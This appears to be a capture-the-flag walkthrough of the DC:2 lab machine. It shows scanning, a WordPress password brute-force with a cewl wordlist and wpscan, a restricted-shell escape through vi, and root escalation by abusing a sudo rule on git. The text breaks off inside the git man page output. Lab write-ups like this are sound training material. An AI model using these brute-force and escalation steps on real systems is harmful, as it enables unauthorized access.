DC:2 is a machine in which I used an enumration to credintials and then exploited the misconfigured sudo permissions to get root Access.

## Scanning
As always, I started scanning with Nmap

```
root@kali:/home/kali# nmap -sC -sV -p- 192.168.198.142
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 06:55 EDT

```
Http and ssh are open. 
## Directory Enumeration
Then I enumerated directories and files using gobuster

```
root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dc-2/ -e php,html,txt,flag,js,json

===============================================================   
```
Just the default directories and nothing interesting.

## Web Enumeration
Using manual browsing I found the first flag.

![Username](/assets/machines/vulnhub/dc2/1.png)

This message implied that I use this tool to generate the wordlist
```
kali@kali:~$ cewl http://dc-2 > Desktop/wl
```

I was curios of how I use this wordlist, I had many thoughts

1. Use this wordlist in gobuster to enumerate the directories (Failed)
2. Use this wordlist in Burpsuite to bruteforce password as admin (Failed)
3. Use this wordlist in Burpsuite to enumerate users (Failed)
4. I used the wordlist in wpscan to bruteforce the password (Worked!)

```
root@kali:/home/kali# wpscan -P Desktop/wl --url http://dc-2

```

So, I got two users' credinatials! I logged in as jerry and found the next flag
![Username](/assets/machines/vulnhub/dc2/2.png)
## From Tom to Jerry
The first thing I thought of from this hint is to ssh. So, I sshed as Tom but with restriected shell ! I bypassed it using using vi.
```
root@kali:/home/kali# ssh -p 7744 tom@192.168.198.142
tom@192.168.198.142's password:

tom@DC-2:~$ ls

vi
[ESC] :set shell=/bin/bash
[ESC] :shell
```

I found the third flag in the home directory of Tom 

```
$ cat flag3.txt
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

```
So, I just had to su to jerry and found the fourth flag

```
tom@DC-2:~$ /bin/su jerry
Password: 
jerry@DC-2:/home/tom$ ls
ls: cannot open directory .: Permission denied
jerry@DC-2:/home/tom$ cd ~
jerry@DC-2:~$ ls
flag4.txt
jerry@DC-2:~$ cat flag4.txt 
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

## Privilege Escalation 
I ran diffrenet Enumeration scripts and found an intersting sudo privilege which allows us to run git as root. after searching in the gtfio of how to get a root shell. I ran the following commands.

```
erry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
jerry@DC-2:~$ sudo git -p help config
GIT-CONFIG(1)                                      Git Manual                                     GIT-CONFIG(1)


NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [<file-option>] [type] [-z|--null] name [value [value_regex]]
       git config [<file-option>] [type] --add name value
       git config [<file-option>] [type] --replace-all name value [value_regex]
       git config [<file-option>] [type] [-z|--null] --get name [value_regex]
       git config [<file-option>] [type] [-z|--null] --get-all name [value_regex]
       git config [<file-option>] [type] [-z|--null] --get-regexp name_regex [value_regex]
       git config [<file-option>] [type] [-z|--null] --get-urlmatch name URL
       git config [<file-option>] --unset name [value_regex]
       git config [<file-option>] --unset-all name [value_regex]
       git config [<file-option>] --rename-section old_name new_name
       git config [<file-option>] --remove-section name
       git config [<file-option>] [-z|--null] -l | --list
       git config [<file-option>] --get-color name [default]
       git config [<file-option>] --get-colorbool name [stdout-is-tty]
       git config [<file-option>] -e | --edit

DESCRIPTION
       You can query/set/replace/unset options with this command. The name is actually the section and the key
       separated by a dot, and the value will be escaped.

       Multiple lines can be added to an option by using the --add option. If you want to update or unset an
       option which can occur on multiple lines, a POSIX regexp value_regex needs to be given. Only the
       existing values that match the regexp are updated or unset. If you want to handle the lines that do not
       match the regex, just prepend a single exclamation mark in front (see also the section called
       âEXAMPLESâ).

       The type specifier can be either --int or --bool, to make git config ensure that the variable(s) are of
       the given type and convert the value to the canonical form (simple decimal number for int, a "true" or
       "false" string for bool), or --path, which does some path expansion (see --path below). If no type
       specifier is passed, no checks or transformations are performed on the value.

       When reading, the values are read from the system, global and repository local configuration files by
       default, and options --system, --global, --local and --file <filename> can be used to tell the command
       to read from only that location (see the section called âFILESâ).

       When writing, the new value is written to the repository local configuration file by default, and
       options --system, --global, --file <filename> can be used to tell the command to write to that location
       (you can say --local but that is the default).

       This command will fail with non-zero status upon error. Some exit codes are:

        1. The config file is invalid (ret=3),

        2. can not write to the config file (ret=4),

        3. no section or name was provided (ret=2),

        4. the section or key is invalid (ret=1),
